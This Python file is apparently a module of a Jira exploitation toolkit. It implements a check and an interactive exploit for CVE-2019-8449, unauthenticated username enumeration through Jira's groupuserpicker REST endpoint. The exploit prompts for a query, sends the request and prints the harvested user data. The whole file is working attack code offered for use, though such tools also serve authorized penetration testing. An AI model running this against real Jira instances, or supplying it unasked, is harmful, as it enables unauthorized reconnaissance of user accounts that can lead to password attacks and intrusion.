#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.style import Style
from jiraffe.enums import Severity


class CVE20198449(Exploit):
    cve = "CVE-2019-8449"
    severity = Severity.LOW
    description = "Unauthenticated username enumeration via GroupUserPicker API"

    def __init__(self, client, target, verbose=False, check_only=False):
        super().__init__(client, target, verbose, check_only)
        self.endpoint = f"{self.target}/rest/api/latest/groupuserpicker"

    def check(self) -> bool:
        """
        Minimal non-intrusive check.
        This endpoint is public on vulnerable instances.
        """
        params = {
            "query": "admin",
            "maxResults": 1,
        }

        try:
            r = self.client.get(self.endpoint, params=params)
            return r.status_code == 200 and r.headers.get(
                "Content-Type", ""
            ).startswith("application/json")
        except Exception:
            return False

    def exploit(self):
        try:
            query = input("[>] Enter search query [required] (e.g. admin): ").strip()
            if not query:
                print(Style.RED("[-] Query is required"))
                return

            max_results = input("[>] Enter max results (default: 50): ").strip() or "50"
            field_id = input("[>] Enter fieldId (optional): ").strip()
            project_id = input("[>] Enter projectId (optional): ").strip()
            issue_type_id = input("[>] Enter issueTypeId (optional): ").strip()

        except KeyboardInterrupt:
            print(Style.RED("Interrupted."))
            return

        payload = {
            "query": query,
            "maxResults": max_results,
            "showAvatar": "true",
            "avatarSize": "xsmall",
            "caseInsensitive": "false",
            "excludeConnectAddons": "false",
        }

        # Optional parameters (only if provided)
        if field_id:
            payload["fieldId"] = field_id
        if project_id:
            payload["projectId"] = project_id
        if issue_type_id:
            payload["issueTypeId"] = issue_type_id

        try:
            r = self.client.get(self.endpoint, params=payload)
            data = r.json()
        except Exception:
            print(
                Style.RED("[-] Target doesn't seem to be vulnerable. [CVE-2019-8449]")
            )
            return

        print(Style.GREEN("[+] SUCCESS"))
        print(Style.MAGENTA(data))
